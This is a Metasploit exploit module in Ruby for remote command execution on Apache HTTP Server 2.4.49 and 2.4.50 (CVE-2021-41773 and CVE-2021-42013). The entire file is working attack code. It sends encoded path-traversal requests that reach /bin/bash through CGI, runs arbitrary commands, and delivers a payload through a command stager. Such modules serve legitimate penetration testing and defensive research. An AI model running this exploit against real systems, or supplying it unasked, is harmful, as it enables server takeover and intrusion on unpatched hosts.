##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Apache HTTP Server 2.4.49 and 2.4.50 Remote Command Execution',
      'Description' => %q{
        This module exploits a path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.49 and 2.4.50 tracked as CVE-2021-41773 and CVE-2021-42013. Remote command execution is possible when CGI scripts are enabled for aliased paths not protected by the default "require all denied" configuration. 
      },
      'Author' => [
        'Ash Daulton', # CVE-2021-41773 vulnerability discovery
        'cPanel Security Team', # CVE-2021-41773 vulnerability discovery
        'LI ZHI XIN', # CVE-2021-42013 vulnerability discovery
        'Werner Bester (Redshift)', # Metasploit module
      ],
      'References' => [
        [ 'CVE', '2021-41773' ],
        [ 'CVE', '2021-42013' ],
        [ 'CWE', '22' ],
        [ 'URL', 'https://nvd.nist.gov/vuln/detail/CVE-2021-41773' ],
        [ 'URL', 'https://nvd.nist.gov/vuln/detail/CVE-2021-42013' ]
      ],
      'Payload'        =>
        {
          'DisableNops' => true,
          'Space'       => 2048
        },
      'Targets'        =>
        [
          [ 'Linux x86',
            {
              'Platform'        => 'linux',
              'Arch'            => ARCH_X86,
              'CmdStagerFlavor' => [ :echo, :printf ]
            }
          ],
          [ 'Linux x86_64',
            {
              'Platform'        => 'linux',
              'Arch'            => ARCH_X64,
              'CmdStagerFlavor' => [ :echo, :printf ]
            }
          ]
        ],
      'DefaultTarget' => 0,
      'DisclosureDate' => '2021-10-06',
      'License' => MSF_LICENSE
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'Base CGI directory path', '/cgi-bin/']),
      OptInt.new('CMD_MAX_LENGTH', [true, 'CMD max line length', 2048]),
      OptString.new('RPATH', [true, 'Target PATH for binaries used by the CmdStager', '/bin']),
      OptInt.new('TIMEOUT', [true, 'HTTP read response timeout (seconds)', 5]),
      OptEnum.new('CVE', [true, 'CVE to check/exploit', 'CVE-2021-42013', ['CVE-2021-41773', 'CVE-2021-42013']]),
      OptInt.new('DEPTH', [true, 'Traversal Depth (to reach the root folder)', 3])
    ])
  end

  # Check if target is vulnerable
  # @return [MSF::Exploit::CheckCode] Check result.
  def check
    
    # Test connection to target
    begin
      res = send_request_cgi({ 'uri' => normalize_uri(target_uri.path) })
    rescue
      vprint_error("#{peer} - Unable to connect to server")
      return Exploit::CheckCode::Unknown
    end

    # Test version: v2.4.49 || 2.4.50 Apache HTTP Server
    if res.headers['Server'] =~ /Apache\/(\d+\.\d+\.\d+)/
      version = Rex::Version.new($1)
      vprint_status("#{peer} - Apache HTTP Server version: #{version}")
      if version == Rex::Version.new('2.4.49') || version == Rex::Version.new('2.4.50')
        print_status("#{peer} - Target Apache HTTP Server appears to be running vulnerable version. Checking if exploitable...")
      end
    else
      print_warning("#{peer} - Target does not appear to be running vulnerable version. Checking if vulnerable...")
    end
    
    # Attempt to execute command
    cmd_res = execute_command("echo #{marker}", "")
    
    if cmd_res && cmd_res.body.include?(marker)
      return Exploit::CheckCode::Vulnerable
    else
        print_status("#{peer} - Target does not seem to be vulnerable. Try increasing the depth and try again.")
        return Exploit::CheckCode::Unknown
    end
  end

  # Execute commands on the remote server
  #
  # @param cmd [String] Command to execute..
  # @param opts [Hash] The HTTP request options to modify.
  # @return [Rex::Proto::HTTP::Response] HTTP Response.
  def execute_command(cmd, opts)
    # Prepend full path to binary
    cmd.gsub!('chmod', "#{datastore['RPATH']}/chmod")
    cmd = "echo Content-Type: text/plain; echo; #{cmd}"    
    
    # Use correct path delimeter for the version. If unsure, use CVE-2021-41773 delimeter. 
    case datastore['CVE']
    when 'CVE-2021-41773'
        path_delimiter = '/%2e%2e'
    else
        path_delimiter = '/.%%32%65'
    end
    
    # Choose shell for target
    shell = "/bin/bash"
    
    # Build URI
    normalized_uri =  normalize_uri(target_uri.path, "#{path_delimiter * datastore['DEPTH']}", shell)
    vprint_status("#{peer} - Sending command to URI: #{normalized_uri}")
       
    # Send request
    response = send_request_cgi(
      {
        'method' => 'POST',
        'uri' => "#{normalized_uri}",
        'encode_params' => false,
        'data' => "#{cmd}"
      }, datastore['TIMEOUT'])
    
    return response
  end
  
  
  # Generate random string
  # @return [String] marker.
  
  def marker
    @marker ||= rand_text_alphanumeric(rand(42) + 1)
  end  
  
  # Starts execution of the exploit chain.
  # @return [void]
  
  def exploit
    # Do not exploit if target is not vulnerable
    unless check == Exploit::CheckCode::Vulnerable
      fail_with(Failure::NotVulnerable, 'Target is not vulnerable')
    end
    print_status("#{peer} - Target is vulnerable!")
    
    # Execute command stager
    execute_cmdstager(:linemax => datastore['CMD_MAX_LENGTH'], :nodelete => true)

  end
end
